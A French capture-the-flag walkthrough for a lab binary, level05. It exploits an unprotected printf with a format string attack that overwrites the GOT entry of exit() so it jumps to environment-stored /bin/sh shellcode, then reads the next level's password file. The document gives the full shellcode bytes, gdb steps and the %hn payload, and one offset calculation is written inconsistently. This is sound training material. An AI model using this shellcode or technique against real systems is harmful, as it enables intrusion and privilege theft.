## 1. Comprendre la faille

Il y a un `printf` non protégé dans le code source, on peut donc faire une format string attack.

## 2. Trouver la position du buffer

On trouve d'abord à quelle adresse de la stack se situe notre buffer avec `%x`.

```bash
python -c 'print "eeee" + " %x"*13' > /tmp/test
cat /tmp/test | ./level05
```

On obtient :

```text
eeee 64 f7fcfac0 0 0 0 0 ffffffff ffffd764 f7fdb000 65656565 20782520 25207825 78252078
```

Notre buffer est donc à la 10eme place de la stack.

## 3. Trouver l'adresse GOT de exit()

On va passer par la table GOT pour rediriger `exit()` vers un shellcode.

Nous allons donc trouver l'adresse de `exit()` dans la table GOT.

```gdb
(gdb) disas exit

0x08048370 <+0>: jmp    *0x80497e0
0x08048376 <+6>: push   $0x18
0x0804837b <+11>: jmp    0x8048330
```

Donc l'adresse de `exit()` dans la GOT est `0x80497e0`.

## 4. Trouver l'adresse du shellcode

On va mettre un shellcode dans l'env et voir son adresse.

```bash
env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb ./level05
```

```gdb
(gdb) b main
(gdb) r
(gdb) x/500s environ

20\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffde4e:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
```

On va donc prendre `0xffffde4e`.

## 5. Préparer l'écriture dans GOT

Il va falloir mettre cette adresse-là dans le `exit()` de GOT.

On va le faire grâce au `printf()`.

L'adresse du shellcode `0xffffde4e` équivaut à `4294958670` en décimal, on ne pourra jamais la print. On va donc diviser l'adresse du `exit` en 2 pour d'abord placer `de4e` et ensuite `ffff` respectivement dans `0x80497e0` puis `0x80497e2` (`0x80497e0 + 2` car `de4e` c'est 2 octets).

```text
de4e = 56910
ffff = 65535
```

On va utiliser le symbole `%hn` dans `printf`, qui permet d'écrire par 2 octets le nombre de caractères.

Sachant qu'on va déjà écrire deux adresses dans le `printf` au début, ce qui fait 8 octets, donc `56910 - 2 = 56902`.

Et comme le compteur de caractères ne repart pas de 0, on doit soustraire pour savoir le nombre de caractères à ajouter.

```text
65535 - 56910 = 8625
```

Avec cette manipulation, on va écrire `\x4e\xde` dans l'adresse `0x80497e0` et `\xff\xff` à l'adresse `0x80497e2`.

## 6. Construire le payload

On crée le payload :

```bash
python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56902d%10\$hn' + '%8625d%11\$hn'" > /tmp/exploit
```

```bash
cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
```

```bash
cat /home/users/level06/.pass
```






